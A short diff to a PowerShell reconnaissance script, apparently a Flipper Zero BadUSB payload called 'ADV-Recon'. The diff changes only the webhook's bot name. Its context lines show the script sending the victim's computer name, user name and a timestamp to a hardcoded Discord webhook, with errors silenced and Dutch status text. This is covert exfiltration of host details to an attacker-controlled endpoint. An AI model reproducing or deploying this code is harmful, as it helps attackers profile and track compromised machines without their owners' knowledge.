@@ -5,7 +5,7 @@ $dc = "https://discord.com/api/webhooks/1430461657829740706/T6oaosfibMgogVMfM5j2
 if ($dc) {
     $hookurl = $dc
     $Body = @{
-        'username' = "ADV-Recon v2.2"
+        'username' = "Flipper Zero"
         'content' = "**Recon GESTART**`n**PC**: $env:COMPUTERNAME`n**User**: $env:USERNAME`n**Tijd**: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     }
     Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue
